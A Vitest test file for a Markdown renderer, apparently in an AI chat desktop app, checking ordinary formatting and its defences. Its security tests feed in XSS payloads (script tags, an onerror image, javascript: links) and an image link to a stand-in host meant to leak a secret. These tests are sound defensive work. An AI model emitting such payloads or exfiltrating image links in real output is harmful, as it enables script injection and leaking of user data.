import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { isOpenableUrl } from "../../src/shared/links";
import { Markdown } from "../../src/renderer/src/Markdown";

const render = (text: string) => renderToStaticMarkup(createElement(Markdown, { text }));

describe("Markdown", () => {
  it("renders the common blocks", () => {
    const html = render("## 标题\n\n**粗体**和`代码`\n\n- 一\n- 二\n\n1. 甲\n2. 乙\n\n> 引用");

    expect(html).toContain("<h2>标题</h2>");
    expect(html).toContain("<strong>粗体</strong>");
    expect(html).toContain("<code>代码</code>");
    expect(html).toMatch(/<ul>\s*<li>一<\/li>/);
    expect(html).toMatch(/<ol>\s*<li>甲<\/li>/);
    expect(html).toContain("<blockquote>");
  });

  it("renders GitHub tables, task lists and strikethrough", () => {
    const html = render("| 名称 | 值 |\n|---|---|\n| a | 1 |\n\n- [x] 完成\n- [ ] 待办\n\n~~删掉~~");

    expect(html).toContain('<div class="md-table"><table>');
    expect(html).toContain("<th>名称</th>");
    expect(html).toContain("<td>1</td>");
    expect(html).toContain('type="checkbox"');
    expect(html).toContain("<del>删掉</del>");
  });

  it("labels code blocks with their language and keeps the code intact", () => {
    const html = render("```python\nprint('<b>')\n```");

    expect(html).toContain('<div class="md-code-bar"><span>python</span>');
    expect(html).toContain("复制");
    expect(html).toContain("print(&#x27;&lt;b&gt;&#x27;)");
  });

  it("keeps raw HTML as text", () => {
    const html = render('<script>alert(1)</script>\n\n<img src=x onerror="alert(1)">\n\n段落<b>粗</b>');

    expect(html).not.toContain("<script");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("<b>");
  });

  it("only makes http(s) links clickable", () => {
    const html = render("[好](https://example.com/a?b=1) [坏](javascript:alert(1)) [文件](file:///C:/x)");

    expect(html).toContain('<a href="https://example.com/a?b=1" title="https://example.com/a?b=1">好</a>');
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("file:");
    expect(html.match(/<a /g)).toHaveLength(1);
  });

  it("never loads images, and shows what they were", () => {
    const html = render("![架构图](https://evil.example/leak?secret=1) ![本地](data:image/png;base64,AAAA)");

    expect(html).not.toContain("<img");
    expect(html).toContain("[图片：架构图]");
    expect(html).toContain('href="https://evil.example/leak?secret=1"');
    expect(html).toContain("[图片：本地]");
  });

  it("renders a reply that is still streaming", () => {
    const html = render("先看代码：\n\n```ts\nconst a = 1;");

    expect(html).toContain("<span>ts</span>");
    expect(html).toContain("const a = 1;");
  });
});

describe("isOpenableUrl", () => {
  it("accepts only http and https", () => {
    expect(isOpenableUrl("https://example.com")).toBe(true);
    expect(isOpenableUrl("http://localhost:3000/x")).toBe(true);
    for (const url of ["javascript:alert(1)", "file:///C:/Windows", "ms-settings:", "vbscript:x", "相对/路径", ""]) {
      expect(isOpenableUrl(url)).toBe(false);
    }
  });
});
